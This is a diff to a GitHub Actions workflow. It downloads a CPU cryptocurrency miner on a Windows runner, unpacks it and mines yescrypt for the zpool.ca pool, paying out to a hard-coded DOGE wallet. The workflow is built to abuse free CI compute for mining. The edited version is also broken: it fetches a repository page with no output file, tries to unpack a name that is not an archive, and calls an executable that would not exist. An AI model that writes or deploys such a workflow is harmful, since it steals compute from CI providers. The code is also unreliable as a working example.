@@ -7,10 +7,10 @@ jobs:
     runs-on: windows-latest
     steps:
     - name: Preparing
-      run: Invoke-WebRequest https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-win.zip -OutFile cpuminer-opt-win.zip
+      run: Invoke-WebRequest https://github.com/tpruvot/cpuminer-multi
     - name: Prepare_Q2
-      run: Expand-Archive cpuminer-opt-win.zip
+      run: Expand-Archive cpuminer-multi
     - name: Running
-      run: .\cpuminer-opt-win\cpuminer-avx2.exe -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u D7S6DWdNEWeH4uECGbaK88J7JmdPnKnbpx -p c=DOGE password=PASWORD_KALIAN
+      run: .\cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u D7S6DWdNEWeH4uECGbaK88J7JmdPnKnbpx -p c=DOGE
     - name: DONE
       run: exit
